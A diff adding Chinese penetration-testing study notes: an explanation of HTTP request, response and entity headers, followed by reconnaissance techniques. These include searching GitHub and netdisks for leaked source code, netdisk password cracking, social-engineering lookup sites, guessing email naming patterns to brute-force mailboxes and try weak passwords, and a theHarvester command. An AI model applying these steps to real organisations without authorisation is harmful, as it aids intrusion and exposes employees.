+- 表示500字节以后的范围：`bytes=500-`
+- 第一个和最后一个字节：`bytes=0-0,-1`
+- 同时指定几个范围：`bytes=500-600,601-999`
+
+但是服务器可以忽略此请求头，如果无条件`GET`包含`Range`请求头，响应会以状态码`206 PartialContent`返回而不是以`200 OK`
+
+#### <font color="yellow">010 `User-Agent`头域</font>
+
+`User-Agent`头域的内容包含发出请求的用户信息
+
+#### <font color="yellow">011 响应消息</font>
+
+响应消息的第一行为下面的格式，`HTTP-VersionSPStatus-CodeSPReason-PhraseCRLF`，`HTTP-Version`表示支持的HTTP版本，例如为HTTP/1.1，`Status-Code`是一个三个数字的结果代码，`Reason-Phrase`给`Status-Code`提供一个简单的文本描述，`Status-Code`主要用于机器自动识别，`Reason-Phrase`主要用于帮助用户理解，`Status-Code`的第一个数字定义响应的类别，后两个数字没有分类的作用
+
+第一个数字可能取5个不同的值
+
+- 1xx
+
+    信息响应类，表示接收到请求并且继续处理
+
+- 2xx
+
+    处理成功响应类，表示动作被成功接收、理解和接受
+
+- 3xx
+
+    重定向响应类，为了完成指定的动作，必须接受进一步处理
+
+- 4xx
+
+    客户端错误，客户请求包含语法错误或者是不能正确执行
+
+- 5xx
+
+    服务端错误，服务器不能正确执行一个正确的请求
+
+响应头域允许服务器传递不能放在状态行的附加信息，这些域主要描述服务器的信息和Request-URI进一步的信息
+
+响应头域包含
+
+- `Age`
+- `Location`
+- `Proxy-Authenticate`
+- `Public`
+- `Retry-After`
+- `Server`
+- `Vary`
+- `Warning`
+- `WWW-Authenticate`
+
+对响应头域的扩展要求通讯双方都支持，如果存在不支持的响应头域，一般将会作为实体头域处理
+
+典型的响应消息
+
+```text
+HTTP/1.0200OK
+Date:Mon,31Dec200104:25:57GMT
+Server:Apache/1.3.14(Unix)
+Content-type:text/html
+Last-modified:Tue,17Apr200106:46:28GMT
+Etag:"a030f020ac7c01:1e9f"
+Content-length:39725426
+Content-range:bytes554554-40279979/40279980
+```
+
+上例第一行表示HTTP服务端响应一个`GET`方法
+
+#### <font color="yellow">012 `Location`响应头</font>
+
+`Location`响应头用于重定向接收者到一个新URI地址
+
+#### <font color="yellow">013 `Server`响应头</font>
+
+`Server`响应头包含处理请求的原始服务器的软件信息，此域能包含多个产品标识和注释，产品标识一般按照重要性排序
+
+#### <font color="yellow">014 实体</font>
+
+请求消息和响应消息都可以包含实体信息，实体信息一般由实体头域和实体组成
+
+实体头域包含关于实体的原信息，实体头包括
+
+- `Allow`
+- `Content-Base`
+- `Content-Encoding`
+- `Content-Language`
+- `Content-Length`
+- `Content-Location`
+- `Content-MD5`
+- `Content-Range`
+- `Content-Type`
+- `Etag`
+- `Expires`
+- `Last-Modified`
+- `extension-header`
+
+`extension-header`允许客户端定义新的实体头，但是这些域可能无法未接受方识别，实体可以是一个经过编码的字节流，它的编码方式由`Content-Encoding`或`Content-Type`定义，它的长度由`Content-Length`或`Content-Range`定义
+
+#### <font color="yellow">015 `Content-Type`实体头</font>
+
+`Content-Type`实体头用于向接收方指示实体的介质类型，指定`HEAD`方法送到接收方的实体介质类型，或`GET`方法发送的请求介质类型`Content-Range`实体头，`Content-Range`实体头用于指定整个实体中的一部分的插入位置，他也指示了整个实体的长度，在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度，一般格式为`Content-Range:bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth`，例如，传送头500个字节次字段的形式`Content-Range:bytes0-499/1234`如果一个http消息包含此节(例如，对范围请求的响应或对一系列范围的重叠请求)，`Content-Range`表示传送的范围，`Content-Length`表示实际传送的字节数
+
+#### <font color="yellow">016 `Last-modified`实体头</font>
+
+- `Allow`
+
+	服务器支持哪些请求方法(如`GET`、`POST`等)
+
+- `Content-Encoding`
+
+	文档的编码(Encode)方法，只有在解码之后才可以得到`Content-Type`头指定的内容类型，利用gzip压缩文档能够显著地减少HTML文档的下载时间，Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它，因此，Servlet应该通过查看`Accept-Encoding`头(即`request.getHeader(Accept- Encoding)`)检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面
+
+- `Content-Length`
+
+	表示内容长度，只有当浏览器使用持久HTTP连接时才需要这个数据，如果你想要利用持久连接的优势，可以把输出文档写入`ByteArrayOutputStram`，完成后查看其大小，然后把该值放入`Content-Length`头，最后通过`byteArrayStream.writeTo(response.getOutputStream())`发送内容
+
+- `Content-Type`
+
+    表示后面的文档属于什么`MIME`类型，Servlet默认为`text/plain`，但通常需要显式地指定为`text/html`，由于经常要设置`Content-Type`，因此`HttpServletResponse`提供了一个专用的方法`setContentTyep`
+
+- `Date`
+
+	当前的`GMT`时间，你可以用`setDateHeader`来设置这个头以避免转换时间格式的麻烦
+
+- `Expires`
+
+	应该在什么时候认为文档已经过期，从而不再缓存它
+
+- `Last-Modified`
+
+	文档的最后改动时间，客户可以通过`If-Modified-Since`请求头提供一个日期，该请求将被视为一个条件`GET`，只有改动时间迟于指定时间的文档才会返回，否则返回一个`304 Not Modified`状态，`Last-Modified`也可用`setDateHeader`方法来设置
+
+- `Location`
+
+	表示客户应当到哪里去提取文档，`Location`通常不是直接设置的，而是通过`HttpServletResponse`的`sendRedirect`方法，该方法同时设置状态代码为302
+
+- `Refresh`
+
+	表示浏览器应该在多少时间之后刷新文档，以秒计，除了刷新当前文档之外，你还可以通过`setHeader("Refresh", "5; URL=http://host/path")`让浏览器读取指定的页面。，注意这种功能通常是通过设置HTML页面`HEAD`区的`＜META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path"＞`实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要，但是，对于Servlet来说，直接设置`Refresh`头更加方便，注意`Refresh`的意义是N秒之后刷新本页面或访问指定页面，而不是每隔N秒刷新本页面或访问指定页面，因此，连续刷新要求每次都发送一个`Refresh`头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用`Refresh`头还是`＜META HTTP-EQUIV="Refresh" ...＞`，注意`Refresh`头不属于HTTP1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它
+
+- `Server`
+
+	服务器名字，Servlet一般不设置这个值，而是由Web服务器自己设置
+
+- `Set-Cookie`
+
+	设置和页面关联的Cookie，Servlet不应使用`response.setHeader("Set-Cookie", ...)`，而是应使用`HttpServletResponse`提供的专用方法`addCookie`
+
+- `WWW-Authenticate`
+
+	客户应该在`Authorization`头中提供什么类型的授权信息，在包含`401 Unauthorized`状态行的应答中这个头是必需的，例如，`response.setHeader("WWW-Authenticate", "BASIC realm=＼"executives＼"")`，注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问，例如`.htaccess`
+
+### <font color="yellow">07 信息泄露</font>
+
+#### <font color="yellow">001 信息泄露主要内容</font>
+
+- 泄露系统的敏感信息
+- 泄露用户敏感信息
+- 泄露用户密码
+
+#### <font color="yellow">002 信息泄露的途径</font>
+
+- 错误信息失控
+- SQL注入
+- 水平权限管理不当
+- XSS/CSRF
+
+#### <font color="yellow">003 防止信息泄露手段</font>
+
+- OAuth思想
+- 一切行为由用户授权
+- 授权行为不泄露敏感信息
+- 授权汇过期
+
+#### <font color="yellow">004 OAuth思想</font>
+
+将业务和敏感资料分离，用户登录后派发凭证，执行业务时把凭证发给业务层，业务层拿用户发的凭证到敏感资料服务去取用户数据，没有凭证不能获取用户数据
+
+#### <font color="yellow">005 Web源代码泄露</font>
+
+通过工具暴破相关Web源代码泄露，最想强调的是github信息泄露了，直接去github上搜索，收获往往是大于付出，可能有人不自信认为没能力去SRC挖洞，可是肯定不敢说不会上网不会搜索，github相关的故事太多，但是给人引出的信息泄露远远不仅在这里
+
+- github.com
+- rubygems.org
+- pan.baidu.com
+- ...
+
+QQ群备注或介绍等，甚至混入企业qq工作群，然后说再多，也没这个好用`https://sec.xiaomi.com/article/37`全自动监控github
+
+信息泄露收集可能会用到如下地址
+
+网盘搜索
+
+- [http://www.pansou.com/](http://www.pansou.com/)
+- [https://www.lingfengyun.com/](https://www.lingfengyun.com/)
+
+网盘密码破解可参考
+
+- [https://www.52pojie.cn/thread-763130-1-1.html](https://www.52pojie.cn/thread-763130-1-1.html)
+
+社工信息泄露
+
+- [https://www.instantcheckmate.com/](https://www.instantcheckmate.com/)
+- [http://www.uneihan.com/](http://www.uneihan.com/)
+
+源码搜索
+
+- [https://searchcode.com/](https://searchcode.com/)
+- [https://gitee.com/](https://gitee.com/)
+- [gitcafe.com](gitcafe.com)
+- [code.csdn.net](code.csdn.net)
+
+钟馗之眼
+
+- [https://www.zoomeye.org/](code.csdn.net)
+
+天眼查
+
+- [https://www.tianyancha.com/](https://www.tianyancha.com/)
+
+其它
+
+- 威胁情报：微步在线
+- ti.360.cn
+- Virustotal
+
+#### <font color="yellow">006 邮箱信息收集</font>
+
+收集邮箱信息主要有两个作用
+
+- 通过发现目标系统账号的命名规律，可以用来后期登入其他子系统
+- 爆破登入邮箱用
+
+通常邮箱的账号有如下几种生成规律
+
+比如某公司有员工名叫做张小三，他的邮箱可能如下
+
+- `zhangxiaosan@xxx.com`
+- `xiaosan.zhang@xxx.com`
+- `zxiaosan@xxx.com`
+
+当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律，除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，`hr@xxx.com`/`kefu@xxx.com`，这种邮箱有时会存在弱口令，在渗透时可额外留意一下，我们可以通过手工或者工具的方式来确定搜集邮箱
+
+手工的方式
+
+> - 可以到百度等搜索引擎上搜索邮箱信息
+> - github等第三方托管平台
+> - 社工库
+
+工具方式
+
+> 在邮箱收集领域不得不提一个经典的工具，The Harvester，The Harvester可用于搜索Google、Bing和PGP服务器的电子邮件、主机以及子域名，因此需要翻墙运行该工具
+> 
+> 工具下载地址为
+> 
+> 	[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
+> 
+> `python -m pip install -r requirements.txt`<font color="red">导入相关配置，python3.6版本</font>
+> 
+> 使用方式很简单：`./theHarvester.py -d 域名 -1 1000 -b all`
+
+历史漏洞收集
+
+> 仔细分析，大胆验证，发散思维，对企业的运维、开发习惯了解绝对是有很大的帮助，可以把漏洞保存下来，进行统计，甚至炫一点可以做成词云展示给自己看，看着看着或者就知道会有什么漏洞
+> 
+> wooyun历史漏洞库
+> 
+> - [http://www.anquan.us/](http://www.anquan.us/)
+> - [http://wooyun.2xss.cc/](http://wooyun.2xss.cc/)
+> 
+> 漏洞银行
+> 
+> - [https://www.bugbank.cn/](https://www.bugbank.cn/)
+> 
+> 360补天
+> 
+> - [https://www.butian.net/](https://www.butian.net/)
+> 
+> 教育行业漏洞报告平台(Beta)
+> 
+> - [https://src.edu-info.edu.cn/login/](https://src.edu-info.edu.cn/login/)
+
+#### <font color="yellow">007 工具信息收集</font>
+
+- 7kbscan
+- 破壳Web极速扫描器
+
+### <font color="yellow">08 业务漏洞</font>
 
 
 
